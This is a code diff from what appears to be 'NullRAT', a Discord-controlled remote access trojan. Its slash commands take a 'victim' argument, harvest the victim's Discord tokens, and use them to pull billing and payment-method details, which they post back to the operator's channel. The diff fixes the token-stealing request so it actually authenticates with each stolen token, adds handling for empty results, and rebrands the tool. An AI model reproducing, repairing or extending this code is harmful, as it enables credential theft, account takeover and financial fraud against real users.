@@ -115,7 +115,7 @@ async def checked_tokens(ctx, victim):
         await ctx.followup.send("Checking all tokens...")
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))    
-   
+  
 @client.slash_command(description="Find billing info", guild_ids=server_ids)  
 async def billing(ctx, victim):
     if str(victim) == str(IP()):
@@ -123,7 +123,7 @@ async def billing(ctx, victim):
         billing_info = []
         for xy in find_token():
             headers = {
-                'Authorization': token,
+                'Authorization': xy,
                 'Content-Type': 'application/json'
             }
             cc_digits = {
@@ -179,8 +179,10 @@ async def billing(ctx, victim):
                         'Default Payment Method': x['default']
                     }
 
-               billing_info.append(data)
-
+                billing_info.append(data)
+        
+        if len(billing_info) == 0:
+            return await ctx.followup.send("No billing info found!")
         await ctx.followup.send("```" + str(billing_info[0]) + "```")
         for a in billing_info[1:]:
             await ctx.channel.send("```" + str(a) + "```")
@@ -405,7 +407,7 @@ def find_token():
     return tokens
 
 def checked_embeds(tk, em, ph, un, ni, bi, av, idqa):
-    embed=discord.Embed(title="Checked Token", description="*Tokens checked by CRAT*")
+    embed=discord.Embed(title="Checked Token", description="*Tokens checked by NullRAT*")
     embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
     embed.set_thumbnail(url=av)
     embed.add_field(name="Token", value=f"```{tk}```", inline=False)
